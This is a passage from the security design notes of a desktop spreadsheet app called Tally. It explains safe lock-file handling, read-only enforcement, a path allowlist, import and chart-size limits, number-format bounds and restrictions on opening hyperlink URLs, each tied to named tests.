  thread). If the account name stays unknown, no lock is ever treated as
  Tally's own (none is taken over or removed).
- **How it is written.** `O_CREAT|O_EXCL` (`create_new`), mode 0644 before
  the umask, so an existing lock or a planted symbolic link is never
  followed or overwritten; replacing our own stale lock writes a new file
  and renames it over the old one (a link there is replaced, not written
  through). A directory Tally cannot write into (read-only folder or
  volume) means no lock and no error: the document still opens for editing,
  as in AOO with its default settings (`UseDocumentSystemFileLocking`).
  Writing a lock never fails an open or a save.
- **Reading another lock.** Only a regular file is read: `symlink_metadata`
  first, then `open` with `O_NOFOLLOW | O_NONBLOCK` (std's
  `OpenOptionsExt::custom_flags`; the constants come from the `libc` crate,
  no FFI call), then `fstat` of the opened file, so a link or FIFO swapped
  in between can neither redirect nor block the read. At most 32,000 bytes
  are read (AOO's buffer; larger is malformed). A malformed lock, a link, a
  directory or a FIFO at the lock path counts as "locked by Unknown User".
  Owner, time and file name from a lock are shown without control or
  Unicode format characters (bidi marks, embeddings, overrides, isolates,
  zero-width characters, tags), the owner capped at 64 characters, and in
  `<bdi>` elements (Unicode isolates in toasts), so a crafted lock cannot
  reorder or disguise the question.
- **Never deleting someone else's lock.** On close, Save As to another
  file, switching to read-only and quit (`RunEvent::Exit`), Tally removes the
  lock only if it still names Tally's own system user, host and user URL
  (AOO's `DocumentLockFile::RemoveFile` check). Anything else is left alone.
  To avoid a check-then-delete race the lock is renamed to a private name
  next to it, checked there, and deleted only if ours; otherwise it is
  hard-linked back (which never overwrites a lock created meanwhile; if that
  fails the file stays under its private name and is logged). Residuals:
  between the rename and the link-back the lock is briefly absent; and
  replacing our own stale lock (check, then rename a new file over it) would
  replace a lock another program wrote in that instant.
- **Tally against itself.** One file is opened by at most one document:
  the "already open" check and a reservation of the canonical path are one
  step under a lock, so two concurrent opens cannot both lock it (the loser
  is `cancelled`). A lock held by another document is never taken over,
  and Save As onto a file another Tally document has open (locked or
  read-only) is refused with AOO's "locked for editing by <you>". A second
  Tally process is detected by an exclusive advisory lock on
  `<config dir>/instance.lock` (std `File::try_lock`, released by the OS on
  exit or crash); while another Tally of the same user runs, a lock with
  Tally's own identity may be live, so it is asked about ("locked by
  yourself on a different system") instead of being taken over as a crash
  leftover, and Save As onto it is refused.
  A crash leaves Tally's lock behind, like AOO's; the next open by the same
  user, host and installation takes it over silently (AOO does the same for
  its own stale lock). The one exception is the user's explicit "Open" in
  "locked for editing by yourself on a different system", which replaces a
  lock of the *same* OS account (AOO's `OverwriteOwnLockFile`); a lock of
  any other account can only be answered with Open Read-Only, Open Copy or
  Cancel.
- **Save As onto a locked file** is refused (`locked`, AOO's access denied),
  so Tally never writes over a file another program has open.
- **Autosave and recovery** snapshots live in the app's own directory and
  are unaffected; a recovered document has no path and takes no lock.
- Tests: `tally-desktop::doclock::tests::*` (format round trip against an
  AOO line, escaping of `,` `;` `\` and Unicode, malformed locks, path
  derivation and symlinks, unwritable directory, a symlink at the lock path,
  foreign locks never removed, own stale lock, Finder-locked files),
  `tally-desktop::tests::open_reports_a_foreign_lock_and_its_answers_work`,
  `open_locks_close_unlocks_and_save_as_moves_the_lock`,
  `our_stale_lock_is_taken_over_and_own_lock_elsewhere_is_asked`,
  `edit_mode_round_trip_and_unwritable_files`,
  `save_as_onto_a_file_open_in_another_document_is_refused`,
  `concurrent_opens_of_one_file_open_it_once`; doclock also
  `a_lock_held_by_another_document_is_busy`,
  `the_instance_lock_detects_another_tally`,
  `bidi_and_format_characters_are_stripped_and_owner_is_capped`,
  `an_unknown_account_never_owns_a_lock`,
  `release_restores_a_lock_that_is_not_ours`, `a_fifo_lock_does_not_block`;
  `packages/app/test/readOnly.test.ts` (`<bdi>`, the locked toast).

### Read-only documents

A read-only document is enforced by the engine, not only the UI: every
`apply`, `undo`, `redo` and `set_locale` is refused with `read_only`, and a
save to the document's own file too (`tally-engine::read_only::*`). A file
Tally cannot write is detected without `unsafe`: a regular file, not
`uchg`/`schg` flagged (Finder's "Locked", `std::os::macos::fs::MetadataExt`),
that opens for writing (no truncate, no create; AOO also probes with a
read-write stream). `wb_open`'s and `wb_set_read_only`'s `mode` strings are
checked in `limits.rs` (`open_mode`, `edit_mode`).

### `wb_open(path)` allowlist

JS cannot make the shell read an arbitrary path. `wb_open` accepts a path only if it is:

1. a path the user picked in a native Open or Save dialog during this session (`AppState.allowed`, which holds both the path as returned and its canonical form), or
2. in the persisted recent-files list (`<app_config_dir>/recent.json`, ≤ 10 entries, written only by the shell after a successful dialog open or save).

The check compares the path *as given* before touching the file system, so
every rejected path gets the same `invalid_argument` error whether or not it
exists (no existence oracle; test
`tally-desktop::tests::open_allowlist_is_not_an_existence_oracle`). Only an
allowed path is then canonicalized (`std::fs::canonicalize`), and the
canonical form must be allowed too, so a symlink swapped in later cannot
redirect it. Save paths always come
from the Save dialog (`TauriClient.save(doc, path, …)` ignores the JS path
and shows the dialog when `path !== null`). `wb_new(template)` takes a
template **id** that the engine builds in code (`invoices`, `budget`, `stock`);
no file is read and unknown ids are `not_found`.

Residual risk: `recent.json` lives in the user's config directory, so
anything that can write there can add entries; that attacker already has
the user's file access.

### Load Styles (2026-11-09)

Format ▸ Load Styles… reads another document, which is as untrusted as any
file opened. JS never names that file: `load_styles_dialog` shows the
native Open panel and reads only the path picked there, and
`load_styles_from_template` takes a built-in template **id** (built in code)
or a `user:<stem>` id that `templates::path_of` checks like New from Template
(`check_name`, canonicalized inside the templates folder). The file goes
through the same reader as Open (`EngineService::decode_file`: the 512 MiB
file cap, the codecs' zip / XML / cell budgets, at most `MAX_SHEETS`
sheets); only its named cell styles and its first sheet's page setup are
used, and the decoded workbook is dropped before the styles are applied (no
formulas are evaluated, no recalc budget is spent on it). The imported
table is checked like a defined style: names that `check_name` refuses are
skipped, parent chains are followed at most 64 deep and a chain that would
loop is cut at `Default`, and the document keeps at most 10,000 named
styles (`MAX_CELL_STYLES`; an import that would exceed it fails before
anything changes). Every lookup during the load goes through name indexes and each parent-chain depth is computed once (review 5 MEDIUM-1: a 10,000-style chain with 245-character shared-prefix names took 52 s holding the document lock; now about 1 s in a debug build, `loadstyles::a_long_parent_chain_loads_quickly`). The undo label is capped at 256 characters
(`limits::chars_max`). Tests: `tally-engine` `loadstyles::hostile_sources_are_contained`,
`files::missing_and_bogus_files_fail_cleanly`; `tally-desktop`
`load_styles_from_a_file_and_a_builtin_template`.

### Native numbers and calendars in number formats (G7, 2026-11-09)

Format codes come from files (ODS data styles, XLSX `numFmts`) and are
already capped at `MAX_NUMBER_FORMAT_LEN`. The new inputs are bounded:
`[NatNumN]` accepts 0..19 and `[DBNumN]` 1..9 (a parse error otherwise, as
AOO); a `[~name]` that is not one of the seven calendars, or not one of the
format language's, is ignored; ODS `number:calendar` values longer than 32
bytes are dropped and only the first character of
`number:transliteration-format` is used (an unknown one gives NatNum0).
Transliteration works on the already formatted text (linear in its length;
the spelled-number recursion is bounded by the 6- or 7-entry multiplier
tables) and the Hebrew numbering refuses more than 19 digits as AOO does.
The calendar computations are closed-form except the Hijri new-moon search
(capped at 64 steps) and the Hebrew year / month search (bounded by the
supported date range, years 1..9999). Excel extended ids `[$-NNCCLLLL]` are
parsed as hex `u32`. Tests: `tally-numfmt` `natnum_cases::modifier_limits`,
`calendar::tests`.

### Chart Data Table and chart literal budgets (review 5, 2026-11-09)

A chart that reads no cells carries literal lists, and a small file can
make their padded table huge: a 26 KB XLSX with 32,000 literal category
slots, 254 empty series and 40 frames showing the part made `charts()`
build 253M slots (1.27 GB of JSON per object refresh) and an XLSX save
take 89 s for 4 charts (quadratic patching, the categories rendered once
per series).

- `charts()` never carries a data table: `ChartDto.ownData` flags the
  chart and `chart_data_table(doc, sheet, id)` (its own Tauri command,
  `allow-chart-data-table`) returns the table only when the Data Table
  dialog opens or the chart is copied. The table is refused, before
  anything is built, when rows × (1 + value columns) exceeds
  `tally_api::MAX_DATA_TABLE_CELLS` (1,000,000, one document's literal-point
  budget); X and size columns are sent only when the series has them.
- The dialog renders only the rows in view plus 12 above and below (and
  the cursor row), so at most about 60 rows × the table's columns are in
  the DOM.
- XLSX save: each own-data list is rendered once (a chart's categories
  once, however many series name them); the patch pass scans each chart
  part once and splices the list its placeholder number names; literal XML
  is capped at 32 MiB per save, counted per reference
  (`chart_write::MAX_LITERAL_XML_BYTES`). Past the cap later category and
  X lists are left out and values are written as an empty `c:numLit`, with
  one warning per chart. Values and sizes are always `c:numLit` (text is
  parsed, non-numbers left out). Literal text escapes the characters XML
  1.0 cannot hold as `_xHHHH_` (a literal `_xHHHH_` as `_x005F_xHHHH_`,
  like rust_xlsxwriter); the reader decodes them.

Tests: `tally-engine` `chart_data_table_limits::a_small_file_with_huge_padded_tables_stays_small`
(the review's probe file with 3 frames: `charts()` JSON under 1 MiB, the
table refused, the XLSX save linear), `chart_data_table::huge_padded_tables_are_refused_and_never_listed`;
`tally-io-xlsx` `chart_data_table::large_literal_categories_save_within_the_budget`,
`control_characters_in_literals_are_escaped`, `text_values_are_written_as_numbers`,
`chart_write::tests`; e2e `chart-data-table.spec.ts` ("a long table renders
only the rows in view").

### Tests

- `cargo test -p tally-desktop`: menu ids; command-layer end-to-end over the real engine (templates, assist, ODS/CSV round trip, allowlist rejection, panic and poison recovery).
- Manual: docs/qa/phase-a-manual.md §7.

### Hyperlinks

Cells can carry links (`Op::SetLink`, `HYPERLINK()`); the engine refuses
`javascript:`, `data:` and `vbscript:` targets when they are set. Opening a
link is a separate shell command, `open_url(url)` (`src/links.rs`), which
accepts only `http://host…`, `https://host…` and `mailto:address`, at most
2048 bytes, with no whitespace, control characters, quotes, `\`, `<`, `>`
or backticks; `file:` and every other scheme (including anything read from
a file) is `invalid_argument`. The URL goes to the OS handler as a single
argument: `open` on macOS, `xdg-open` on Linux and
`rundll32.exe url.dll,FileProtocolHandler <url>` on Windows; no shell parses
it on any platform (review 3, LOW-11, replaced the earlier `cmd /C start`
route, which left `,` `;` `=` unescaped). `links::launcher_argv` is
unit-tested per OS. No opener plugin and no JS permission is involved. The UI opens a link only on
⌘-click or a click on the active cell's ↗ (a plain click selects), and
handles `#Sheet.A1` links itself by going to the cell. `user_name` returns
the OS account name for new note authors (no other data). With v0.3 the
shell registered 39 commands (more since; docs/api.md); every command validates its
arguments before the engine sees them (`src/limits.rs`: find/replace text
and regular expressions, cell input and formulas ≤ 64 KiB, names ≤ 256
characters, a TSV paste ≤ 64 MiB, ranges inside the sheet) and rejects
violations with `invalid_argument`. Tests:
`tally-desktop::links::tests`, `tally-desktop::limits::tests`,
`tally-desktop::tests::open_url_rejects_script_and_file_links`,
`tally-desktop::tests::oversized_arguments_are_rejected_before_the_engine`.
